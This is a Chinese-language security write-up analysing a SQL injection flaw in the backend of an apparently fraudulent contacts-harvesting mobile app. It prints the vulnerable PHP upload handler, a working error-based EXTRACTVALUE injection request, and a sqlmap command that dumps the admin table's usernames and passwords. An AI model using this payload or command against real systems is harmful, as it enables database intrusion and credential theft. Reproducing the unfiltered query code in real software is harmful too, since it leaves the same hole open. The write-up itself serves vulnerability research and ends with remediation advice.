> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxOTM2MDYwNg==&mid=2247515236&idx=1&sn=fc3c5c6dbf3b2cbc32405070170609d6

#  2025某新版诈骗双端APP通讯录前台SQL注入漏洞  
原创 子午猫  网络侦查研究院   2025-07-13 00:03  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4kCmTUe2v2bujwd3M0M1ICStsbhAHWtth8dQwoBBFoNDafDAzGbm1sCA8bqVWIjs40A8lu9rtuD4yeOOwDNadg/640?wx_fmt=png "")  
  
#   
  
在当今数字化时代，各类应用程序如潮水般涌现，然而，其中不乏一些隐藏着安全隐患的恶意程序，某新版诈骗双端APP便是如此。这款APP不仅试图获取用户的双端通讯录、相册、短信、定位以及已安装APP信息，其代码还毫无加密措施，搭建过程也相对简单，安卓端为原生纯源码，iOS端则是uniapp纯源码，具有一定的迷惑性，引得不少人寻找使用。通过Fofa指纹识别，发现它由Thinkphp5提供高性能框架开发而生，且从后台信息可知其框架为ThinkPHP 5.0.24 ，Debug处于开启状态。接下来，我们将对该APP存在的前台SQL注入漏洞进行详细分析与复现。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cGNmvfrEicd34KiaNEhz7XREk6pMgmCibhxuVWsibfnrDdybRGkCcWszWmGHMgOOTBAf2f8S5viaKibPBA/640?wx_fmt=other&from=appmsg "")  
## 0x00 漏洞产生根源剖析  
### 漏洞触发点及相关代码逻辑  
  
该漏洞位于APP的 /api.php 文件中。从代码结构来看，通过GET方式传入ID参数，此参数直接进入SQL查询语句，并且在传入过程中未进行任何过滤处理，这就为SQL注入漏洞的产生埋下了隐患。同时，代码中还要求通过POST方式传入img参数，然而实际上传文件的后缀却被写死为.png 。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cGNmvfrEicd34KiaNEhz7XREd8El63icYY7Xx7nK3n3xGv87YTsEaia3xYJSqOUJt3Zd3trLLpvnx9hw/640?wx_fmt=other&from=appmsg "")  
  
具体来看相关代码：  

```
header('Access-Control-Allow-Origin:*');
header('Content-Type:text/plain;charset=utf-8');
require('conn.php');

function imgbc($image)
{
    $imageName = &#34;25220_&#34;.date(&#34;His&#34;,time()).&#34;_&#34;.rand(1111,9999).'.png';
    if (strstr($image,&#34;,&#34;)){
      $image = explode(',',$image);
      $image = $image[1];
    }
    $path = &#34;./uploads/&#34;.date(&#34;Ymd&#34;,time());
    if (!is_dir($path)){ //判断目录是否存在 不存在就创建
      mkdir($path,0777,true);
    }
    $imageSrc= $path.&#34;/&#34;. $imageName; //图片名字
    $r = file_put_contents($imageSrc, base64_decode($image));//返回的是字节数
    return&#34;/uploads/&#34;.date(&#34;Ymd&#34;,time()).&#34;/&#34;. $imageName;
}

if(isset($_POST['img'])){
    $img = imgbc('data:image/jpg;base64,'.$_POST['img']);
    $userid = $_GET['id'];
    $sqlUser = &#34;select * from app_user where name = '$userid'&#34;;
    $resultUser = mysqli_query($conn,$sqlUser);
    if ($resultUser->num_rows > 0) {
        $row = $resultUser->fetch_assoc();
        $user_id = $row['id'];
        $sql = &#34;INSERT INTO app_xiangce VALUES (null, '&#34;.$user_id.&#34;',null,'&#34;.$img.&#34;', '&#34;.time().&#34;')&#34;;
        if ($conn->query($sql) == TRUE) {
            echo&#34;成功&#34;;
        } else {
            echo&#34;Error: &#34;. $sql. &#34;<br>&#34;. $conn->error;
        }
    }else{
         echo&#34;Error: &#34;. $sql. &#34;<br>&#34;. $conn->error;
    }
}

```

  
在这段代码中，当通过POST方式接收到img参数后，先经过imgbc函数处理，生成一个以特定格式命名的图片路径。然后获取通过GET传入的id参数，用于查询app_user表中对应的用户信息。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cGNmvfrEicd34KiaNEhz7XREEiaXtZNLcCaNFlZRrTU2cgf1VZ7GLeITwWGfgAbrQmmeiadQibLfjDaGQ/640?wx_fmt=other&from=appmsg "")  
  
如果查询到用户信息，便将相关数据插入到app_xiangce表中。但由于id参数直接用于SQL查询且未过滤，攻击者可以利用这一点构造恶意的SQL语句，从而实现SQL注入攻击。  
## 0x01 漏洞复现过程详解  
### 利用Payload进行爆库  
  
我们可以使用以下Payload来进行爆库操作：  

```
POST /api.php?id='+AND+EXTRACTVALUE(6165,CONCAT(0x5c,(SELECT+(USER()))))--+KrBJ HTTP/1.1
Host: 192.168.140.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 5

img=1

```

  
这个Payload利用了MySQL的EXTRACTVALUE函数，通过构造特殊的字符串，将查询的用户信息以一种可被识别的方式暴露出来。在这个Payload中，CONCAT函数将特定字符与查询的用户名连接起来，而EXTRACTVALUE函数则会尝试解析这个构造的字符串，由于其中包含不符合XML格式的内容，从而导致数据库报错，在报错信息中便会显示出我们想要获取的用户名。  
### 使用sqlmap工具进一步挖掘  
  
除了手动构造Payload进行简单的爆库操作外，我们还可以借助强大的sqlmap工具来深入挖掘数据库信息。例如，使用以下命令：  

```
Python sqlmap.py -r a.txt --level=3 --dbms=mysql -T app_admin -C name,password --dump

```

  
这里的 -r 参数指定了包含HTTP请求的文件a.txt ， --level参数设置为3表示使用较高的检测等级，以提高检测的准确性和全面性。 --dbms参数指定数据库类型为mysql 。 -T参数指定要查询的表为app_admin ， -C参数指定要获取的列分别为name和password ，最后 --dump参数表示将查询到的数据进行转储，也就是获取并显示这些数据，从而爆出管理员表的账密信息。  
  
这种SQL注入漏洞的存在，对于使用该APP的用户以及相关系统的安全性都构成了严重威胁。一方面，攻击者可以通过爆库获取用户的敏感信息，如账号密码等，进一步实施诈骗等恶意行为；另一方面，对于APP运营方来说，数据库的泄露可能导致严重的法律和声誉问题。因此，及时发现并修复此类漏洞，对于保障用户和系统的安全至关重要。同时，开发者在开发过程中应加强对输入参数的过滤和验证，遵循安全的编程规范，从源头上杜绝此类漏洞的产生。  
  
  
  
  
**END**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4kCmTUe2v2bujwd3M0M1ICStsbhAHWtt0VVqCfFLOVnpmeNJ3R59doWtI0AmqLn4Qkic8aAS06l0pATjcYx10zw/640?wx_fmt=png "")  
  
  
